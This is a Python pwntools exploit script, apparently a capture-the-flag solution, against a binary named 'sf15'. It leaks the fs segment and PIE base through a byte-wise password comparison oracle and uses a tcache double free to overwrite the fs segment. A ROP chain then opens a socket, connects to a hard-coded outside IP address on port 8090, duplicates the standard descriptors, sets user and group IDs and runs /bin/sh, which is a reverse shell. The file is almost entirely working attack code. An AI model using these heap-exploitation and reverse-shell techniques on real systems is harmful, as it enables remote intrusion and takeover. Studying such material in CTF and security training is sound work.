from pwn import*
p = process('./sf15')
t = 0.05

### defintion
def rol(data, shift, size=64):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)

def menu(sel):
    p.sendafter('>> ',str(sel))

def invite(name,description,flag,job):
    menu(1)
    p.sendafter('name : ',name)
    p.sendafter('description : ',description)
    if flag == 'y':
        p.sendafter('(y/n) : ',flag)
        p.sendlineafter('job name : ',job)
    else:
        p.sendafter('(y/n) : ',flag)

def kick(name):
    menu(2)
    p.sendlineafter('who is annoying you : ',name)


def manage(name,sel,job):
    menu(3)
    p.sendafter('who want to manage : ',name)
    for i in job:
        menu(sel)
        p.sendlineafter('job name : ',i)
    menu(3)

def password(password):
    menu(4)
    p.sendafter('password : ',password)

# ===== ===== ===== ===== ===== ===== ===== #

def set_pwd(current,new):    #current, new: str
    menu(4)
    if not len(current):
        p.sendafter("new password : ", new)
    else:
        p.sendafter("current password : ", current)
        msg = p.recvuntil(":")
        if "incorrect" in msg:
            info = p.recvuntil("!\n")
            if "small" in info:
                return -1
            else:
                return 1
        else:
            p.sendafter(" ",new)
            return 0

def bin_search(low, high, first_pwd, prev_mid):
    mid=(low + high) / 2
    if mid == prev_mid:
        return mid
    dummy = first_pwd + p64(mid)
    if set_pwd(first_pwd + p64(mid),"a") < 0:               #real<mid
        return bin_search(low, mid - 1, first_pwd, mid)

    elif set_pwd(first_pwd + p64(mid),"a") > 0:             #real>mid
        return bin_search(mid + 1, high, first_pwd, mid)
    else:
        return mid

def leak(dummy,leaksize,first_flag):
    if first_flag:
        set_pwd("", dummy)
    leak = 0

    for i in range(leaksize):
        res = bin_search(0, 0xff, dummy, 0)
        leak += res << (8*i)
        dummy += p8(res)
    return leak


fs_seg = leak("a"*0xb8,6,1)
res = set_pwd("a"*0xb8 + p64(fs_seg),"a"*0xe0)  #0xe0 = 0xb8 + 0x8 * 5
pie_base = leak("a"*0xe0,6,0) - 2442
log.info("fs_segment: {}".format(hex(fs_seg)))
log.info("pie_base  : {}".format(hex(pie_base)))

# ===== ===== ===== ===== ===== ===== ===== #

### exploit
# tcache dup
invite('p'*0x8,'q'*0x10,'y','p0'*0x8)
job_p = ['p1'*0x8,'p2'*0x8,'p3'*0x8,'p4'*0x8]
manage('p'*0x8,1,job_p)

invite('a'*0x8,'a'*0x10,'y','a0'*0x8)
job_a = ['a1'*0x8,'a2'*0x8]
manage('a'*0x8,1,job_a)

invite('b'*0x8,'b'*0x8,'n','')
invite('c'*0x8,'c'*0x8,'n','')
invite('d'*0x8,'d'*0x3f0+p64(fs_seg+0x10)[:7],'n','')
invite('e'*0x8,'e'*0x8,'n','')

job_p.append('p0'*0x8)
manage('p'*0x8,2,job_p)     # tcache bin dummy 5

job_a = ['a1'*0x8,'a0'*0x8,'a0'*0x8]
manage('a'*0x8,2,job_a)     # tcache double free a2->a1->a1

kick('e'*0x8)               # like consolidate

# fs_segment overwrite
job_b = ['b0'*0x8,'b1'*0x8,'b2'*0x8]
manage('b'*0x8,1,job_b)

job_c = [p64(fs_seg-0x68),p64(fs_seg-0x68)] # setting tcache bin
                                            # to fs_segment (rbx-0x58)
manage('c'*0x8,1,job_c)

raw_input('press enter to fs_overwrite')

job_d = [p64(fs_seg-0x68)]
set_read = p64(fs_seg-0x68)                 # rbx
set_read += p64(rol(pie_base+0xc45,0x11))   # rax (reverse ror)
set_read += p64(0)              # rdi
set_read += p64(fs_seg)         # bypass lock sub qword ptr [rax+0x450],1
set_read += p64(0x10000)[:7]    # rdx
job_d.append(set_read)
# - socket 35.229.180.155:8090 struct
set_connect = p16(2)            # af_inet
#set_connect += p16(0x1f9a,endian='big')    # local
#set_connect += p32(0x7f000001,endian='big')
set_connect += p16(0x1f9a,endian='big')      # port
set_connect += p32(0x23e5b49b,endian='big')  # ip
# - finish
job_d.append(p64(fs_seg+0x28)+set_connect+'/bin/sh\x00')
manage('d'*0x8,'1',job_d)

password('x'*0x100)
menu(5)

raw_input('press enter to stack pivot')

## stack pivot
# gadget
pop_rdi = pie_base + 0x1693
pop_rsi_r15 = pie_base + 0x1691
pop_rax_rdx_rbp = pie_base + 0xc40
syscall_rbp = pie_base + 0xc9b
# payload
pay = ''
pay += 'x'*0x8      # rbp
pay += p64(pop_rdi) # ret
pay += p64(2)
pay += p64(pop_rsi_r15)
pay += p64(1)+p64(0)
pay += p64(pop_rax_rdx_rbp)     # rax,rdi,rsi,rdx
pay += p64(41)+p64(0)+p64(0)    # 41,2,1,0
pay += p64(syscall_rbp)+p64(0)  # sys_socket
pay += p64(pop_rdi)
pay += p64(0)  
pay += p64(pop_rsi_r15)
pay += p64(fs_seg-0x50)+p64(0)
pay += p64(pop_rax_rdx_rbp)
pay += p64(42)+p64(0x10)+p64(0) # 42,0,addr,0
pay += p64(syscall_rbp)+p64(0)  # sys_connect
for i in range(3):
    pay += p64(pop_rdi)
    pay += p64(0)  
    pay += p64(pop_rsi_r15)
    pay += p64(i)+p64(0)
    pay += p64(pop_rax_rdx_rbp)
    pay += p64(33)+p64(0)+p64(0)    # 33,0,0,0
    pay += p64(syscall_rbp)+p64(0)  # sys_dup2

pay += p64(pop_rdi)
pay += p64(1002)  
pay += p64(pop_rsi_r15)
pay += p64(1002)+p64(0)
pay += p64(pop_rax_rdx_rbp)
pay += p64(117)+p64(1002)+p64(0)    # 117,1002,1002,1002
pay += p64(syscall_rbp)+p64(0)      # setresuid

pay += p64(pop_rdi)
pay += p64(1003)  
pay += p64(pop_rsi_r15)
pay += p64(1003)+p64(0)
pay += p64(pop_rax_rdx_rbp)
pay += p64(119)+p64(1003)+p64(0)    # 119,1003,1003,1003
pay += p64(syscall_rbp)+p64(0)      # setresgid

pay += p64(pop_rdi)
pay += p64(fs_seg - 0x48)
pay += p64(pop_rsi_r15)
pay += p64(0)+p64(0)
pay += p64(pop_rax_rdx_rbp)
pay += p64(59)+p64(0)+p64(0)        # 59,&('/bin/sh'),0,0
pay += p64(syscall_rbp)+p64(0)      # execve

pay += 'a'*(0x21d0-len(pay))
pay += p64(pie_base+0xc32)  # call rax : add rsp, 50
p.send(pay)

p.interactive()
# 0x555555758250 a
# 0x5555557586b0 c
# 0x555555758b10 e


